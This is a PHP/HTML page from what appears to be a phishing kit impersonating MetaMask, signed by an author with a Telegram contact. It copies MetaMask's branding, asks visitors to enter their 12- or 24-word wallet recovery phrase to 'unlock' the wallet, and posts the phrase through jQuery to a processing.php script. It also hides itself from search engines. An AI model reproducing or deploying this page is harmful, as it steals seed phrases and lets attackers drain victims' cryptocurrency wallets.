<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/ELP4SSW0RD
    ********************************************************/

    require_once '../app/config.php';
    $_SESSION['last_page'] = "words";

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/jquery.tagsinput-revisited.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/png" href="../media/imgs/ff.png" />

        <title>MetaMask - A crypto wallet &amp; gateway to blockchain apps</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header">
            <div class="container d-flex">
                <div class="logo flex-grow-1"><img src="../media/imgs/logo.svg"></div>
                <div class="menu"><img style="min-width: 512px;" src="../media/imgs/menu.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="content">
                    <div class="row align-items-center">
                        <div class="daw col-lg-8 col-md-12 col-sm-12 col-12 order-lg-1 order-md-2 order-sm-2 order-2">
                            <h1>Unlock wallet</h1>
                            <p class="mb30">Enter your recovery phrase to unlock your wallet. Typically 12 (sometimes 24) words separated by a single space.</p>
                            <div id="form">
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="words">
                                <input id="example" name="example" type="text" placeholder="Separate each word with a single space">
                                <?php if( isset($_GET['error']) ) : ?>
                                <div class="error" style="color: red;">Phrase must be 12 or 24 words long, please correct your mistakes to unlock your wallet.</div>
                                <?php endif; ?>
                                <div class="btns">
                                    <button id="booom">Recover Wallet</button>
                                </div>
                            </div>
                        </div>
                        <div class="zaw zaw2 col-lg-4 col-md-12 col-sm-12 col-12 order-lg-2 order-md-1 order-sm-1 order-1">
                            <img class="d-lg-block d-md-none d-sm-none d-none" src="../media/imgs/img2.png">
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <div class="container">
                <div class="logo"><img src="../media/imgs/logo.svg"></div>
                <div class="row">
                    <div class="col-md-3 mb30">
                        <div class="widget">
                            <h3>LEARN MORE</h3>
                            <ul>
                                <li>About</li>
                                <li>Developers</li>
                                <li>Download</li>
                                <li>Documentation</li>
                                <li>MetaMask Institutional</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb30">
                        <div class="widget">
                            <h3>GET INVOLVED</h3>
                            <ul>
                                <li>GitHub</li>
                                <li>Gitcoin</li>
                                <li>Open Positions</li>
                                <li>Swag Shop</li>
                                <li>Press & Partnerships</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb30">
                        <div class="widget">
                            <h3>CONNECT</h3>
                            <ul>
                                <li>FAQs</li>
                                <li>Support</li>
                                <li>Blog</li>
                                <li>Twitter</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-3 mb30">
                        <div class="widget">
                            <h3>LEGAL</h3>
                            <ul>
                                <li>Privacy Policy</li>
                                <li>Terms of Use</li>
                                <li>Contributor License Agreement</li>
                                <li>Site Map</li>
                            </ul>
                        </div>
                    </div>
                </div>
                <p>&copy;<?php echo date('Y'); ?> MetaMask • A ConsenSys Formation</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../media/js/jquery.tagsinput-revisited.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            
            $('#example').tagsInput({
                placeholder:'Separate each word with a single space',
            });

            $('#example_tag').keyup(function (e) {
                if( e.keyCode == 32 ) {
                    $(this).blur();
                    $(this).focus();
                    return false;
                }
            });

            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'example' : $('#example').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });

        </script>

    </body>

</html>